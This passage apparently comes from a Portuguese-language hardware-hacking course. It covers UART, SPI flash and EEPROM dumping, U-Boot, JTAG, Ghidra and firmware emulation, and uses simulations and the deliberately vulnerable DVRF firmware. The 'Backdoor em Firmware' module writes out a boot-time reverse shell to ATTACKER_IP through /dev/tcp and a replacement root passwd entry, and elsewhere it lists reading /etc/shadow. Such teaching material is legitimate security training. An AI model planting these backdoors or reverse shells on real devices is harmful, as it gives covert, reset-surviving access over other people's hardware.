Ler uma PCB é como ler um mapa de cidade visto de cima. Os chips grandes são os "prédios" (SoC, flash, RAM). As trilhas são as "ruas" conectando eles. Os test points são as "portas" que os engenheiros deixaram para manutenção — e que você vai usar para entrar. Com prática, você olha uma PCB e em 30 segundos já identifica: "Flash SPI ali, provavelmente UART naqueles 4 pinos, SoC é aquele BGA no centro".

#### Projeto: "Análise Forense de PCB"
1. Use as fotos de PCB obtidas via FCC ID no módulo anterior, ou busque PCBs em alta resolução no [OpenWrt wiki](https://openwrt.org/toh/start)
2. Para cada PCB, identifique e marque (pode usar Paint/GIMP):
   - SoC principal (maior chip, geralmente BGA)
   - Chip(s) de flash (SOIC-8, geralmente perto do SoC)
   - RAM (chips retangulares próximos ao SoC)
   - Headers/test points potenciais para UART
   - Headers/test points potenciais para JTAG
   - Antena Wi-Fi/BLE
   - Regulador de tensão
   - Cristal oscilador
3. Busque os part numbers de cada CI identificado — confirme a função
4. **Prompt IA**: Tire uma foto (ou use foto do FCC) e peça: *"Identifique os componentes nesta PCB e suas possíveis funções. Foque em interfaces de debug e pontos de acesso."* (Valide a resposta!)
5. **Entregável**: PCB anotada com todos componentes identificados + part numbers + funções

---

### Módulo 2.3: Identificação de Pinos e Interfaces com Multímetro (Simulado)
**Tempo: 1.5h**

#### O que memorizar
- **Modo continuidade**: bipe = conexão elétrica. Use para mapear GND, VCC, e trilhas entre test points e chips
- **Medição de tensão DC**: VCC típico é 3.3V ou 5V. UART TX idle = VCC (HIGH). RX = pode estar flutuante
- **Identificação de UART sem documentação**:
  1. Encontre GND (continuidade com blindagem/terra do conector de força)
  2. Encontre VCC (3.3V ou 5V constante)
  3. TX = pino que varia durante o boot (dados saindo do dispositivo)
  4. RX = pino restante (geralmente flutuante ou em HIGH)
- **Baud rate detection**: conecte TX ao UART adapter, tente baud rates comuns começando por 115200

#### Intuição
Com um multímetro de R$30, você pode identificar pinos UART em minutos. O truque é pensar como o circuito: GND está conectado a todo o plano de terra da PCB. VCC é estável em 3.3V. TX é o pino "falante" — durante o boot, ele transmite dados e a tensão varia. RX é o "ouvinte" — fica quieto esperando dados. É detetive elétrico: cada medição elimina possibilidades.

#### Projeto: "UART Pin Detective (Simulação)"
1. No [Wokwi](https://wokwi.com/), monte:
   - ESP32 transmitindo dados via UART a 115200 baud
   - Use o Serial Monitor para ver a saída
2. Documente o procedimento teórico de identificação de pinos UART como se estivesse numa PCB real:
   - Passo 1: Teste continuidade — identifique GND
   - Passo 2: Meça tensão — identifique VCC (3.3V constante)
   - Passo 3: Observe variação durante boot — identifique TX
   - Passo 4: Pino restante = RX
3. Escreva um script Python para **auto-detect baud rate**:
   ```python
   import serial
   COMMON_BAUDS = [9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600]
   def detect_baud(port):
       for baud in COMMON_BAUDS:
           with serial.Serial(port, baud, timeout=2) as ser:
               data = ser.read(100)
               # Se contém caracteres ASCII imprimíveis, provavelmente acertou
               printable = sum(1 for b in data if 32 <= b <= 126)
               if printable > len(data) * 0.5:
                   return baud
       return None
   ```
4. **Entregável**: Procedimento documentado + script de detecção de baud rate

---

### Módulo 2.4: Mapeamento Completo de um Alvo
**Tempo: 2h**

#### O que memorizar
- **Checklist de mapeamento**:
  - [ ] Hardware: SoC, Flash, RAM, interfaces expostas
  - [ ] Software: OS, versão do kernel, bootloader, serviços
  - [ ] Rede: portas abertas, protocolos, APIs
  - [ ] Físico: test points, headers, componentes removíveis
  - [ ] Supply chain: fabricante, ODM, firmware compartilhado entre modelos
- **Documentação estruturada**: sempre documente de forma que outro pesquisador possa reproduzir

#### Intuição
Este módulo junta tudo dos anteriores. Aqui você pratica o fluxo completo de reconhecimento que um pesquisador de segurança de hardware faz antes de qualquer ataque. É o planejamento antes da ação. Um mapeamento bem feito reduz horas de tentativa e erro.

#### Projeto: "Target Assessment Report"
1. Escolha o alvo mais promissor do Módulo 2.1
2. Compile um relatório completo:
   - **Seção 1**: Informações públicas (FCC, datasheets, CVEs)
   - **Seção 2**: Análise de PCB (componentes identificados, interfaces)
   - **Seção 3**: Análise de firmware preliminar (Binwalk, strings)
   - **Seção 4**: Superfícies de ataque identificadas
   - **Seção 5**: Plano de ataque priorizado
3. Use IA para revisão: *"Revise este relatório de assessment de hardware. Estou esquecendo alguma superfície de ataque?"*
4. **Entregável**: Relatório profissional em markdown (mínimo 3 páginas)

---

## Fase 3 — Interfaces Seriais: Ataque e Exploração

### Módulo 3.1: Exploração UART na Prática
**Tempo: 2h**

#### O que memorizar
- **Frame UART**: idle HIGH → start bit (LOW) → 8 data bits (LSB first) → stop bit (HIGH)
- **Conexão cruzada**: TX do dispositivo → RX do adapter, RX do dispositivo → TX do adapter
- **Ferramentas de terminal serial**: `minicom`, `screen`, `picocom`, PuTTY
- **Comandos após obter shell**: `id`, `whoami`, `cat /etc/shadow`, `ps`, `netstat`
- **Problemas comuns**: baud rate errado (lixo na tela), TX/RX invertidos, level mismatch (3.3V vs 5V)

#### Intuição
UART é a porta dos fundos que engenheiros deixaram aberta. Durante o desenvolvimento, eles precisam de um console para debug — e frequentemente esquecem de desabilitar na produção. Conectar-se ao UART de um dispositivo é como encontrar um terminal de manutenção destrancado num prédio. Muitas vezes, o console UART dá acesso root direto, sem senha.

#### Projeto: "UART Shell via Emulação"
1. No **Wokwi**, crie um ESP32 que simula um "dispositivo IoT":
   ```cpp
   void setup() {
     Serial.begin(115200);
     Serial.println("=== IoT Device v1.0 ===");
     Serial.println("U-Boot 2021.01 (Jan 01 2021)");
     Serial.println("Loading kernel...");
     delay(2000);
     Serial.println("Welcome to BusyBox v1.30.1");
     Serial.println("root@device:~#");
   }
   void loop() {
     if (Serial.available()) {
       String cmd = Serial.readStringUntil('\n');
       if (cmd == "id") Serial.println("uid=0(root) gid=0(root)");
       else if (cmd == "cat /etc/passwd") Serial.println("root:x:0:0:root:/root:/bin/sh");
       else if (cmd == "uname -a") Serial.println("Linux device 4.14.90 armv7l GNU/Linux");
       else Serial.println("sh: " + cmd + ": not found");
     }
   }
   ```
2. Interaja via Serial Monitor — simule a experiência de conectar-se a um UART real
3. Alternativamente, use **QEMU** para emular um sistema ARM completo:
   ```bash
   # Baixe uma imagem ARM Debian
   qemu-system-arm -M virt -m 256M -nographic \
     -kernel vmlinuz -initrd initrd.img \
     -append "console=ttyAMA0"
   ```
4. Documente o processo como se fosse um pentest report
5. **Entregável**: Log completo da sessão UART + relatório de achados

#### Erros Comuns
- **TX/RX invertidos**: se nada aparece, troque os fios TX↔RX. É o erro #1 mais comum
- **Baud rate errado**: se aparece "lixo" na tela, é quase certeza baud rate errado. Tente 115200 primeiro
- **Level mismatch**: conectar adaptador USB-UART de 5V em dispositivo de 3.3V pode danificá-lo. Verifique ANTES
- **Não ter GND comum**: o GND do seu adapter DEVE estar conectado ao GND do dispositivo
- **Pressionar Enter rápido demais**: alguns dispositivos precisam de um delay entre caracteres

---

### Módulo 3.2: Dump de Flash SPI
**Tempo: 2h**

#### O que memorizar
- **Pinout SPI flash (SOIC-8)**: pin 1=CS, 2=MISO(DO), 3=WP, 4=GND, 5=MOSI(DI), 6=CLK, 7=HOLD, 8=VCC
- **Comando de leitura**: enviar opcode `0x03` + 3 bytes de endereço → dados fluem pelo MISO
- **Ferramentas de dump**: `flashrom` (com CH341A ou Bus Pirate), `spiflash.py`
- **Conexão**: SOP8 clip (clamp no chip sem dessoldar) ou dessoldar o chip
- **Verificação de integridade**: comparar CRC32/MD5 de múltiplos dumps — devem ser idênticos

#### Intuição
A flash SPI é o "HD" de um dispositivo embarcado — contém TODO o firmware: bootloader, kernel, filesystem, configurações. Ler essa flash é como clonar o HD de um computador. Com os dados da flash, você pode fazer análise offline completa sem precisar mais do hardware. O SOP8 clip é como uma "garra" que abraça o chip de 8 pinos, permitindo leitura sem dessoldar.

#### Projeto: "Simulação de Dump SPI"
1. Crie um "firmware simulado" para análise:
   ```bash
   # Crie um arquivo binário com estrutura de firmware
   dd if=/dev/urandom of=fake_firmware.bin bs=1M count=16
   # Insira um header U-Boot
   echo -n "U-Boot 2021.01" | dd of=fake_firmware.bin bs=1 seek=0 conv=notrunc
   # Insira strings "sensíveis"
   echo -n "admin:password123" | dd of=fake_firmware.bin bs=1 seek=65536 conv=notrunc
   ```
2. Pratique análise com `flashrom` em modo de simulação:
   ```bash
   flashrom --programmer dummy:emulate=W25Q128FV,image=fake_firmware.bin -r dump.bin
   ```
3. Verifique integridade:
   ```bash
   md5sum fake_firmware.bin dump.bin  # devem ser iguais
   ```
4. Analise o dump com Binwalk:
   ```bash
   binwalk dump.bin
   strings dump.bin | grep -i "password\|admin\|root\|secret"
   ```
5. **Prompt IA**: *"Este é o output do binwalk em um dump de flash SPI de 16MB. Identifique as partições e sugira qual contém dados sensíveis."*
6. **Entregável**: Dump + análise completa + credenciais extraídas

---

### Módulo 3.3: Leitura e Escrita I2C EEPROM
**Tempo: 1.5h**

#### O que memorizar
- **Protocolo I2C resumido**: START → endereço (7-bit) + R/W bit → ACK → dados → ACK → STOP
- **EEPROMs comuns**: AT24C02 (256 bytes), AT24C256 (32KB) — armazenam configuração, chaves, licenças
- **Endereços I2C típicos de EEPROM**: 0x50-0x57 (dependendo dos pinos A0-A2)
- **Scan I2C**: `i2cdetect -y 1` no Linux lista todos os dispositivos conectados ao barramento
- **Ferramentas**: `i2ctools` no Linux, Bus Pirate, scripts Python com `smbus2`

#### Intuição
EEPROMs I2C são como pen drives minúsculos soldados na PCB. Fabricantes guardam nelas: números de série, chaves de licença, configurações de fábrica, calibração de sensores, e às vezes até credenciais. São fáceis de ler e escrever — muitas vezes sem nenhuma proteção. É como encontrar um post-it com a senha colado no monitor.

#### Projeto: "EEPROM Hacking Simulado"
1. No **Wokwi**, monte um Arduino + EEPROM AT24C256 via I2C
2. Programe o Arduino para:
   - Escrever dados "sensíveis" na EEPROM (WiFi SSID/password, serial number)
   - Ler e exibir os dados via Serial
3. Escreva um script Python que simule a leitura de uma EEPROM:
   ```python
   # Simulação - em hardware real usaria smbus2
   eeprom_data = bytearray(256)
   eeprom_data[0:4] = b'\xDE\xAD\xBE\xEF'  # magic bytes
   eeprom_data[16:32] = b'MyWiFi_Network\x00\x00'
   eeprom_data[32:48] = b'SuperSecret123!\x00'
   
   # Dump e análise
   for i in range(0, len(eeprom_data), 16):
       hex_part = ' '.join(f'{b:02x}' for b in eeprom_data[i:i+16])
       ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in eeprom_data[i:i+16])
       print(f'{i:04x}: {hex_part}  {ascii_part}')
   ```
4. **Entregável**: Código funcional + dump formatado + análise dos dados "sensíveis"

---

### Módulo 3.4: Projeto Integrado — Full Serial Attack Chain
**Tempo: 2.5h**

#### O que memorizar
- **Attack chain completa**: OSINT → identificar interfaces → conectar UART → obter shell → extrair flash → analisar firmware
- **Pivoting**: do shell UART, usar rede para atacar outros dispositivos
- **Persistência**: modificar firmware, escrever backdoor na flash, alterar configurações na EEPROM

#### Intuição
Até agora você aprendeu cada técnica isoladamente. Agora é hora de encadear tudo como um ataque real. Em um pentest de hardware real, você não faz "só UART" ou "só SPI" — você começa com reconhecimento, identifica o vetor mais promissor, obtém acesso inicial, e depois pivota para extrair o máximo de informação e acesso possível.

#### Projeto: "Pentest de IoT Completo (Simulado)"
1. Use o **DVRF (Damn Vulnerable Router Firmware)**:
   ```bash
   git clone https://github.com/praetorian-inc/DVRF
   cd DVRF
   binwalk -e DVRF_v03.bin
   ```
2. Emule o firmware com QEMU:
   ```bash
   # Use o firmware-analysis-toolkit para emulação automatizada
   cd firmware-analysis-toolkit
   python3 fat.py /path/to/DVRF_v03.bin
   ```
3. Execute a cadeia completa de ataque:
   - **Reconhecimento**: Binwalk, strings, file analysis
   - **Acesso**: Encontre credenciais hardcoded ou serviços vulneráveis
   - **Exploração**: Identifique e explore vulnerabilidades (buffer overflow, command injection)
   - **Pós-exploração**: Extraia dados sensíveis, documente tudo
4. Documente cada passo como relatório de pentest
5. **Prompt IA**: *"Encontrei estes binários no firmware: [lista]. Quais são os mais prováveis de conter vulnerabilidades e que tipo de bugs devo procurar?"*
6. **Entregável**: Relatório completo de pentest estilo profissional

---


### Módulo 3.5: Interação com U-Boot e Bootloaders
**Tempo: 2h**

#### O que memorizar
- **U-Boot** é o bootloader mais comum em dispositivos embarcados Linux (roteadores, câmeras, NAS, etc.)
- **Acesso**: geralmente via UART — durante o boot, pressione uma tecla (Enter, espaço, ou sequência especial) para interromper o autoboot
- **Comandos U-Boot essenciais**:
  ```
  help                    # lista todos os comandos disponíveis
  printenv                # mostra todas as variáveis de ambiente
  setenv bootargs "..."   # altera argumentos do kernel
  md 0x80000000 100       # memory display — lê memória a partir de um endereço
  sf probe; sf read       # lê SPI flash direto pelo U-Boot
  tftpboot                # boot via rede (útil para carregar firmware modificado)
  bootm / bootz           # boot manual do kernel
  ```
- **Variáveis críticas**: `bootcmd` (comando executado no autoboot), `bootargs` (parâmetros do kernel), `bootdelay` (tempo para interromper)
- **Bypass de senha U-Boot**: se o bootloader exige senha, pode ser possível alterar o `bootdelay` via EEPROM ou encontrar a senha no dump da flash

#### Intuição
O bootloader é o **primeiro software** que roda quando o dispositivo liga. Ele inicializa o hardware e carrega o kernel. Controlar o bootloader é como controlar o BIOS/UEFI de um PC — você pode alterar o que roda, como roda, e com que permissões. Em dispositivos IoT, o U-Boot frequentemente permite: mudar argumentos do kernel para boot em modo single-user (root sem autenticação), carregar firmwares alternativos via rede, e ler/escrever diretamente na flash. É o ponto de ataque mais poderoso depois de JTAG.

**Analogia**: se o dispositivo é uma casa, o U-Boot é a construtora que monta a casa antes de entregar a chave. Se você interceptar a construtora, pode mudar a planta, instalar portas extras, ou até construir uma passagem secreta.

#### Projeto: "U-Boot Explorer"
1. **Emule um sistema com U-Boot via QEMU**:
   ```bash
   # Baixe uma imagem U-Boot pré-compilada para ARM
   # Opção 1: Use o QEMU com U-Boot
   qemu-system-arm -M vexpress-a9 -m 256M -nographic \
     -kernel u-boot.bin
   # Opção 2: Explore logs de U-Boot reais (disponíveis em wikis OpenWrt)
   ```
2. **Alternativamente, analise logs de U-Boot**:
   - Busque: `"U-Boot" "Hit any key" site:openwrt.org` ou em fóruns de modding
   - Identifique nos logs: versão do U-Boot, comandos disponíveis, variáveis de ambiente
3. **Exercício de bypass simulado**:
   - Dado um `printenv` de um dispositivo, identifique:
     - Qual kernel está sendo carregado e de onde
     - Como alterar `bootargs` para adicionar `init=/bin/sh` (bypass de init → shell root direto)
     - Como alterar o `bootcmd` para carregar firmware via TFTP
4. **Escreva um script Python** que parseia output de `printenv` e identifica variáveis de segurança:
   ```python
   def analyze_uboot_env(printenv_output):
       """Analisa variáveis U-Boot e identifica riscos de segurança"""
       risks = []
       for line in printenv_output.strip().split('\n'):
           key, _, value = line.partition('=')
           if 'password' in key.lower():
               risks.append(f"⚠️ Possível senha em '{key}': {value}")
           if key == 'bootdelay' and int(value) > 0:
               risks.append(f"�� Autoboot interrompível (delay={value}s)")
           if 'init=/bin/sh' in value:
               risks.append(f"🚨 Boot para shell root configurado em '{key}'")
           if 'console=' in value:
               risks.append(f"📟 Console serial habilitado em '{key}': {value}")
       return risks
   ```
5. **Prompt IA**: *"Este é o output do printenv de um roteador. Identifique todas as variáveis que podem ser exploradas para obter acesso root ou modificar o comportamento de boot."*
6. **Entregável**: Análise de printenv + script de parser + documentação de técnicas de bypass

#### Erros Comuns
- Não interromper o boot a tempo (o `bootdelay` pode ser de apenas 1 segundo — fique pronto!)
- Alterar `bootargs` e esquecer de salvar com `saveenv` (a mudança se perde no reboot)
- Conectar UART com baud rate errado e não ver a mensagem "Hit any key"
- Assumir que todo dispositivo usa U-Boot (alguns usam bootloaders proprietários, CFE, ou RedBoot)

#### Checkpoint — Fim da Fase 3
Antes de avançar para JTAG, você deve conseguir:
- [ ] Conectar-se a um UART e obter shell (mesmo simulado)
- [ ] Explicar a diferença entre UART, SPI e I2C (quando usar cada um)
- [ ] Fazer dump de flash SPI e analisar o conteúdo
- [ ] Interagir com U-Boot e entender as variáveis de ambiente
- [ ] Ler dados de uma EEPROM I2C
- [ ] Executar uma cadeia de ataque completa (recon → acesso → exploração)

---

## Fase 4 — Debug Interfaces: JTAG e SWD

### Módulo 4.1: JTAG — Teoria e Identificação
**Tempo: 2h**

#### O que memorizar
- **Sinais JTAG (IEEE 1149.1)**: TDI, TDO, TCK, TMS, TRST (opcional) + VCC + GND
- **TAP State Machine**: Test-Logic-Reset → Run-Test-Idle → Shift-DR/IR → Update-DR/IR
- **Boundary Scan**: permite "ver" e controlar pinos do chip individualmente (teste de manufatura)
- **IDCODE Register**: identificação do chip via JTAG (fabricante, part number, versão)
- **Ferramentas**: OpenOCD, JTAGulator, Bus Pirate, J-Link, ST-Link

#### Intuição
JTAG é como ter acesso administrativo ao nível mais baixo de um processador. Foi criado para teste de manufatura — verificar se as soldas estão boas na fábrica. Mas pesquisadores descobriram que também permite: ler/escrever memória, pausar a CPU, inserir breakpoints, e fazer debug em tempo real. É como ter um debugger GDB conectado direto no hardware. O desafio é encontrar e identificar os pinos na PCB — um JTAGulator automatiza isso testando todas as combinações possíveis.

#### Projeto: "JTAG Discovery Simulado"
1. Estude o **TAP State Machine** — desenhe o diagrama de estados no papel/draw.io
2. No Wokwi ou com um STM32 virtual, entenda a interface SWD (versão simplificada do JTAG da ARM):
   - SWDIO (dados bidirecional) e SWCLK (clock) — apenas 2 pinos!
3. Instale e configure **OpenOCD**:
   ```bash
   sudo apt install openocd
   openocd --version
   # Explore os config files
   ls /usr/share/openocd/scripts/target/
   ls /usr/share/openocd/scripts/interface/
   ```
4. Simule uma sessão OpenOCD (usando um target virtual ou config de teste):
   ```bash
   # Exemplo com simulação
   openocd -f interface/dummy.cfg -c "adapter driver dummy" \
           -c "transport select jtag" -c "jtag newtap chip cpu -irlen 4"
   ```
5. Escreva um script Python que simula a lógica do JTAGulator (bruteforce de pinos):
   ```python
   # Simulação da lógica de identificação JTAG
   import itertools
   
   pins = ['P1', 'P2', 'P3', 'P4', 'P5', 'P6']
   jtag_signals = ['TCK', 'TMS', 'TDI', 'TDO']
   
   for combo in itertools.permutations(pins, len(jtag_signals)):
       mapping = dict(zip(jtag_signals, combo))
       # Em hardware real: enviar IDCODE command e verificar resposta válida
       print(f"Testando: {mapping}")
       # Simular: 1 em 360 combinações "funciona"
   ```
6. **Entregável**: Diagrama TAP State Machine + script de bruteforce + notas sobre OpenOCD

---

### Módulo 4.2: Exploração via JTAG/SWD
**Tempo: 2h**

#### O que memorizar
- **Memory dump via JTAG**: `mdw` (memory display word), `mdb` (byte) no OpenOCD
- **Flash programming**: `flash write_image`, `flash read_image` no OpenOCD
- **CPU control**: `halt`, `resume`, `step`, `reg` (ler registradores), `bp` (breakpoint)
- **GDB remote**: OpenOCD expõe GDB server na porta 3333 — conecte com `gdb-multiarch`
- **Bypass de proteções**: alguns chips têm bit de proteção que pode ser resetado via JTAG

#### Intuição
Com JTAG conectado, você é deus do processador. Pode pausar a execução em qualquer instrução, ler toda a memória (incluindo RAM com dados sensíveis em runtime), e até modificar a flash para inserir backdoors. Muitos fabricantes "desabilitam" JTAG apenas removendo o header — mas os pads permanecem na PCB. Outros configuram fuses de proteção, mas às vezes esses fuses podem ser bypassados com glitching.

#### Projeto: "Debug Session com QEMU + GDB"
1. Compile um programa ARM simples (simulando firmware):
   ```c
   // firmware_sim.c
   #include <stdio.h>
   #include <string.h>
   
   char secret_key[] = "SUPER_SECRET_KEY_2024";
   char admin_pass[] = "admin123";
   
   int check_auth(const char *input) {
       return strcmp(input, admin_pass) == 0;
   }
   
   int main() {
       char buffer[64];
       printf("Device Console v1.0\n");
       printf("Password: ");
       scanf("%63s", buffer);
       if (check_auth(buffer)) {
           printf("Access granted! Key: %s\n", secret_key);
       } else {
           printf("Access denied.\n");
       }
       return 0;
   }
   ```
2. Cross-compile e execute com QEMU + GDB:
   ```bash
   arm-linux-gnueabihf-gcc -g -static -o firmware_sim firmware_sim.c
   # Terminal 1: QEMU com GDB server
   qemu-arm-static -g 1234 ./firmware_sim
   # Terminal 2: GDB
   gdb-multiarch ./firmware_sim
   (gdb) target remote :1234
   (gdb) break check_auth
   (gdb) continue
   ```
3. No GDB, extraia a senha sem digitá-la:
   - `x/s &admin_pass` — lê a string da memória
   - `x/s &secret_key` — lê a chave secreta
   - `info registers` — vê todos os registradores
4. **Entregável**: Log completo da sessão GDB mostrando extração de segredos via debug

---

### Módulo 4.3: Proteções e Bypass
**Tempo: 1.5h**

#### O que memorizar
- **Readout Protection (RDP)**: STM32 — Level 0 (sem proteção), Level 1 (JTAG desabilitado, reversível), Level 2 (permanente)
- **Code Protection (CRP)**: NXP LPC — CRP1, CRP2, CRP3 (progressivamente mais restritivo)
- **Secure Boot**: verifica assinatura do firmware antes de executar
- **JTAG Lock/Fuse**: bit OTP que desabilita JTAG permanentemente
- **Bypass conhecidos**: voltage glitching no momento do check, exploits no UART bootloader, cold boot attacks

#### Intuição
Fabricantes sabem que JTAG é um risco e implementam proteções. Mas proteção perfeita é rara — especialmente em dispositivos baratos. RDP Level 1 no STM32 pode ser bypassado com fault injection no momento certo. CRP em LPC tem falhas conhecidas em certas versões. Secure boot pode ser bypassado se você controlar o bootloader ou encontrar uma vulnerabilidade no processo de verificação. É um jogo de gato e rato constante.

#### Projeto: "Análise de Proteções"
1. Pesquise e documente as proteções de 3 MCUs populares:
   - STM32F103 (RDP)
   - ESP32 (Secure Boot + Flash Encryption)
   - NXP LPC1768 (CRP)
2. Para cada, documente:
   - Níveis de proteção disponíveis
   - Bypasses conhecidos (pesquise papers, apresentações de conferências)
   - Ferramentas necessárias para o bypass
   - Custo e complexidade do ataque
3. Use IA: *"Quais são os bypasses conhecidos para STM32 RDP Level 1? Cite papers específicos e técnicas."*
4. Crie uma tabela comparativa de proteções
5. **Entregável**: Documento de análise comparativa + referências a papers/talks

---

## Fase 5 — Firmware: Extração, Análise e Exploração

### Módulo 5.1: Extração e Descompressão de Firmware
**Tempo: 2h**

#### O que memorizar
- **Binwalk flags essenciais**: `-e` (extrair), `-E` (entropy), `-A` (opcodes), `-W` (diff entre firmwares)
- **Filesystems embarcados**: SquashFS, JFFS2, CramFS, UBIFS, YAFFS2
- **Compressão**: gzip, LZMA, XZ, LZ4 — Binwalk detecta automaticamente
- **Estrutura típica de firmware**: header → bootloader → kernel → rootfs → config → art (calibração wireless)
- **Entropy analysis**: alta entropia = comprimido ou criptografado; baixa = dados raw ou strings

#### Intuição
Firmware é tipicamente um blob binário que contém tudo empacotado: bootloader + kernel + filesystem. Binwalk é como um raio-X — mostra as "camadas" dentro do blob. A análise de entropia é especialmente poderosa: se uma seção tem entropia próxima de 1.0 (máxima), provavelmente está criptografada (e não apenas comprimida). Se a entropia cai abruptamente, você encontrou o fim de uma seção comprimida. É como ler o "DNA" do firmware.

#### Projeto: "Firmware Forensics"
1. Baixe firmwares reais de 3 fabricantes diferentes:
   - TP-Link: `https://www.tp-link.com/br/support/download/`
   - D-Link: `https://support.dlink.com/`
   - OpenWrt: `https://downloads.openwrt.org/`
2. Analise cada um com Binwalk:
   ```bash
   binwalk firmware.bin          # assinaturas
   binwalk -E firmware.bin       # entropia (gera gráfico)
   binwalk -e firmware.bin       # extrair
   ```
3. Compare as estruturas: qual fabricante usa que filesystem? Que compressão?
4. Para cada firmware extraído, identifique:
   - Versão do kernel e do BusyBox
   - Serviços de rede habilitados
   - Credenciais hardcoded
5. Gere um gráfico de entropia comparativo
6. **Prompt IA**: *"Este é o output do binwalk. A entropia mostra um bloco de alta entropia em offset 0xA0000-0x1F0000. O que isso provavelmente significa?"*
7. **Entregável**: Relatório comparativo de 3 firmwares + gráficos de entropia

---

### Módulo 5.2: Análise Estática com Ghidra
**Tempo: 2.5h**

#### O que memorizar
- **Ghidra workflow**: criar projeto → importar binário → selecionar arquitetura (ARM LE 32-bit para maioria dos IoT) → auto-analysis → explore
- **Janelas importantes**: Decompiler (pseudocódigo C), Listing (assembly), Symbol Tree, Cross References
- **Buscar vulnerabilidades**: strings suspeitas, chamadas a `system()`, `strcpy()`, `sprintf()`, `gets()`
- **Funções perigosas**: qualquer coisa que copie dados sem verificar tamanho = potencial buffer overflow
- **Scripts Ghidra**: Python/Java scripts para automação de busca

#### Intuição
Ghidra transforma código de máquina incompreensível em pseudocódigo C legível. Não é perfeito, mas reduz dramaticamente o tempo de análise. Para hardware hacking, você geralmente procura: funções de autenticação (bypass), chamadas de sistema perigosas (command injection), criptografia fraca ou hardcoded keys, e backdoors intencionais. A IA pode acelerar isso: cole o pseudocódigo no ChatGPT e peça análise de vulnerabilidades.

#### Projeto: "Reverse Engineering de Binário IoT"
1. Use um binário do DVRF ou do EmbedOS (baixados na Fase 0)
2. Importe no Ghidra:
   - File → Import File → selecione a arquitetura correta (MIPS LE 32-bit para DVRF)
   - Deixe o auto-analysis rodar (pode levar alguns minutos)
3. Navegue pelo código:
   - Busque strings: Window → Defined Strings → filtre por "password", "admin", "key"
   - Encontre cross-references de strings interessantes (duplo clique → References)
   - Analise a função que usa a string no Decompiler
4. Identifique pelo menos 2 vulnerabilidades:
   - Buffer overflow (strcpy sem bounds check)
   - Command injection (system() com input do usuário)
   - Credenciais hardcoded
5. **Prompt IA**: Cole o pseudocódigo C da função suspeita e peça: *"Analise esta função decompilada de um firmware IoT. Identifique vulnerabilidades e sugira como explorar."*
6. **Entregável**: Screenshots do Ghidra + análise de cada vulnerabilidade encontrada

---

### Módulo 5.3: Emulação de Firmware com QEMU
**Tempo: 2.5h**

#### O que memorizar
- **QEMU system mode**: emula CPU + memória + periféricos → roda o firmware "completo"
- **QEMU user mode**: `qemu-{arch}-static` → roda um único binário de outra arquitetura
- **chroot trick**: montar o filesystem extraído e fazer chroot com qemu-static para rodar binários nativamente
- **FAT (Firmware Analysis Toolkit)**: automatiza emulação de firmware com QEMU
- **Firmadyne**: framework para emulação e análise automatizada de firmware Linux

#### Intuição
Emulação é o "modo Deus" da análise de firmware — você roda o firmware sem ter o hardware, pode inspecionar tudo em tempo real, e testar exploits sem risco de brickar um dispositivo. Nem sempre funciona perfeitamente (hardware-specific drivers podem falhar), mas quando funciona, é extremamente poderoso. É como ter um clone virtual do dispositivo que você pode quebrar e refazer infinitamente.

#### Projeto: "Emulação de Roteador Virtual"
1. Use o Firmadyne/FAT para emular um firmware real:
   ```bash
   cd firmware-analysis-toolkit
   ./fat.py /path/to/firmware.bin
   # Se tudo der certo, o firmware vai bootar e você terá acesso web/SSH
   ```
2. Se FAT não funcionar, use chroot manual:
   ```bash
   cd squashfs-root
   cp $(which qemu-mipsel-static) ./usr/bin/
   sudo chroot . /usr/bin/qemu-mipsel-static /bin/sh
   # Agora você tem shell dentro do firmware!
   ```
3. Com o firmware emulado:
   - Acesse a interface web (se houver)
   - Explore o sistema como se fosse o dispositivo real
   - Identifique serviços rodando e teste vulnerabilidades
4. **Entregável**: Screenshots do firmware emulado + log de exploração

---

### Módulo 5.4: Modificação e Reempacotamento de Firmware
**Tempo: 2h**

#### O que memorizar
- **Processo**: extrair → modificar → reempacotar → flash (ou emular)
- **Ferramentas de reempacotamento**: `mksquashfs`, `mkfs.jffs2`, firmware-mod-kit
- **Modificações comuns**: adicionar backdoor, habilitar telnet/SSH, trocar senha root, inserir rootkit
- **Checksums**: muitos firmwares têm CRC verifications — precisar recalcular após modificação
- **Assinatura digital**: firmwares assinados requerem bypass do secure boot (muito mais difícil)

#### Intuição
Modificar firmware é o equivalente a trocar o motor de um carro enquanto ele anda. Você extraiu o firmware, entendeu a estrutura, e agora pode alterá-lo. Inserir um backdoor persistente (SSH habilitado, senha conhecida, reverse shell no boot) significa que mesmo que o usuário "resete" o dispositivo, seu acesso permanece gravado na flash. É o ataque mais impactante em hardware hacking.

#### Projeto: "Backdoor em Firmware"
1. Usando o firmware OpenWrt extraído anteriormente:
   ```bash
   cd squashfs-root
   # Adicionar backdoor: habilitar telnet com senha conhecida
   echo "root:\$1\$xyz\$hashedpassword:0:0:root:/root:/bin/sh" > etc/passwd
   # Adicionar script de reverse shell no boot
   cat > etc/init.d/backdoor << 'EOF'
   #!/bin/sh
   /bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
   EOF
   chmod +x etc/init.d/backdoor
   ```
2. Reempacote o filesystem:
   ```bash
   mksquashfs squashfs-root new_rootfs.sqsh -comp xz
   ```
3. Emule o firmware modificado e verifique que o backdoor funciona
4. Documente como um advisory de segurança: impacto, exploração, mitigação
5. **Entregável**: Firmware modificado + prova de conceito funcional + advisory

---

### Módulo 5.5: Análise de Firmware Criptografado
**Tempo: 2h**

#### O que memorizar
- **Indicadores de criptografia**: entropia próxima a 1.0 uniforme, sem strings legíveis, sem headers reconhecíveis
- **Criptografia vs compressão**: compressão tem padrões (magic bytes gzip, LZMA header); criptografia não
- **Abordagens de ataque**: encontrar a chave no bootloader (precisa ser decriptado em algum momento), ataque de downgrade (versão antiga sem criptografia tem a chave), dump via JTAG da RAM durante boot
- **Ferramentas**: `binwalk -E` (entropia), `binwalk -A` (arch detection, pode falhar em dados criptografados)

#### Intuição
Firmware criptografado parece ser o fim da linha, mas raramente é. O dispositivo precisa decriptar o firmware para executá-lo — a chave de decriptação está em algum lugar (bootloader, OTP fuses, TEE). É como um cofre: a combinação pode ser complicada, mas alguém precisa saber para abrir. Técnicas comuns: estudar versões antigas do firmware (antes de implementarem criptografia), buscar a chave no bootloader via JTAG dump, ou interceptar a decriptação em tempo real.

#### Projeto: "Cracking Firmware Encryption"
1. Crie um firmware "criptografado" para praticar:
   ```bash
   # Crie firmware simulado e criptografe
   tar czf firmware_original.tar.gz squashfs-root/
